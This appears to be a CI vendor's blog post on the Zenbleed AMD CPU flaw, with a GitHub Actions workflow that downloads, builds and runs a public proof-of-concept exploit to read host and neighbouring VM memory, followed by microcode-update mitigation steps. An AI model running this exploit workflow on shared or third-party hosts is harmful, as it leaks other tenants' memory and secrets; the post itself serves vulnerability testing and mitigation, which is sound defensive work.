---
title: Update your AMD hosts now to mitigate the Zenbleed exploit
description: "Learn how to update the microcode on your AMD CPU to avoid the Zenbleed exploit."
tags:
- images
- packer
- qemu
- kvm
author_img: alex
image: "/images/2023-07-zenbleed/background.png"
date: "2023-07-31"
---

On 24th July 2023, [The Register covered a new exploit](https://www.theregister.com/2023/07/24/amd_zenbleed_bug/) for certain AMD CPUs based upon the Zen architecture. The exploit, dubbed Zenbleed, allows an attacker to read arbitrary physical memory locations on the host system. It works by allowing memory to be read after it's been set to be freed up aka "use-after-free". This is a serious vulnerability, and you should update your AMD hosts as soon as possible.

Even more dangerous was the claim by The Register that any level of VM isolation prevents the exploit from working. This is not true. We tested the exploit with a sample GitHub Action running within Firecracker.

We ran a matrix build that creates many VMs running different versions of K3s, then we started a PoC Zenbleed exploit written by [Tavis Ormandy](https://twitter.com/taviso), a security researcher at Google, which scanned for 1000 pieces of data in memory.

We found that the exploit was able to read the memory of the host system, and that the exploit was able to read the memory of other VMs running on the same host.

```yaml
name: build

on:
    pull_request:
        branches:
        - '*'
    push:
        branches:
        - master
        - main
    workflow_dispatch:

jobs:
    build:
        name: specs
        runs-on: actuated
        steps:
        - uses: actions/checkout@v1
        - name: Download exploit
          run: |
            curl -L -S -s -O https://lock.cmpxchg8b.com/files/zenbleed-v5.tar.gz
            tar -xvf zenbleed-v5.tar.gz
            sudo apt install -qy build-essential make nasm
        - name: Build exploit
          run: |
            cd zenbleed
            make
            chmod +x ./zenbleed
        - name: Run exploit for 1000 pieces of data
          run: |
            ./zenbleed/zenbleed -m 1000
```

Full details of the exploit can be found on a microsite created by the security researcher who discovered the vulnerability.

[Zenbleed by Tavis Ormandy](https://lock.cmpxchg8b.com/zenbleed.html#vulnerability)

We didn't see any secrets printed out during the scan, but we did see part of a public SSH key, console output from etcd running within K3s, and instructions from containerd. So we can assume anything that was within memory within one of the other VMs on the host, or even the host itself, could be read by the exploit.

![GHA output from the zenbleed exploit](/images/2023-07-zenbleed/gha.png)
> GHA output from the zenbleed exploit

## Mitigation

AMD has already released a mitigation for the Zenbleed exploit, which requires an update to the CPU's microcode.

[Ed Vielmetti](https://www.linkedin.com/in/edwardvielmetti/), Developer Partner Manager at Equinix told us that mitigation is three-fold:

1. There is an incoming BIOS update from certain vendors that will update the microcode.
2. Updating some OSes like the Ubuntu 20.04 and 22.04 will upgrade the microcode of the CPU.
3. There is a ["chicken bit"](https://www.reddit.com/r/linux/comments/15903hr/zenbleed_a_useafterfree_in_amd_zen2_processors/) that can be enabled which prevents the exploit from working.

I probably don't need to spell this out, but a system update looks like the following, and the reboot is required:

```bash
sudo apt update -qy && \
    sudo apt upgrade -yq && \
    sudo reboot 
```

![An update to the CPU microcode is required](/images/2023-07-zenbleed/microcode.png)

For some unknown reason, both of the Equinix AMD hosts that we use internally broke after running the OS upgrade, so I had to reinstall Ubuntu 22.04 using the dashboard. If for whatever reason the machine won't come up after the microcode update, then you should reinstall the Operating System (OS) using your vendor's rescue system or out of band console, both Equinix Metal and Hetzner have an "easy button" that you can click for this. If there is still an issue after that, reach out to your vendor's support team.

We offer 500 USD of free credit for new Equinix Metal customers to use with actuated, and Equinix Metal have also written up their own guide on workaround here:

* [An Update On the AMD Zen 2 CPU Vulnerability](https://deploy.equinix.com/blog/an-update-on-the-amd-zen-2-cpu-vulnerability/)

## Verifying the mitigation

Since actuated VMs use Firecracker, you should run the above workflow before and after to verify the exploit was a) present and b) mitigated.

![What it looks like when the mitigation is in place](/images/2023-07-zenbleed/mitigated.png)
> Above: What it looks like when the mitigation is in place

You can also run the exploit on the host by copying and pasting the commands from the GitHub Action above.

My workstation uses a Ryzen 9 CPU, so when I ran the exploit I just saw a blocking message instead of memory regions:

```bash
$ grep "model name" /proc/cpuinfo |uniq
model name	: AMD Ryzen 9 5950X 16-Core Processor

./zenbleed -m 100
*** EMBARGOED SECURITY ISSUE --  DO NOT DISTRIBUTE! ***
ZenBleed Testcase -- taviso@google.com

NOTE: Try -h to see configuration options

Spawning 32 Threads...
Thread 0x7fd0d40e8700 running on CPU 0
Thread 0x7fd0d38e7700 running on CPU 1
...
```

## Wrapping up

Actuated uses Firecracker, an open source Virtual Machine Manager that works with Linux KVM to run isolated systems on a host. We have verified that the exploit works on Firecracker, and that the mitigation works too. So whilst VM-level isolation and an immutable filesystem is much more appropriate than a container for CI, this is an example of why we must still be vigilant and ready to respond to security vulnerabilities. 

This is an unfortunate, and serious vulnerability. It affects bare-metal, VMs and containers, which is why it's important to update your systems as soon as possible.
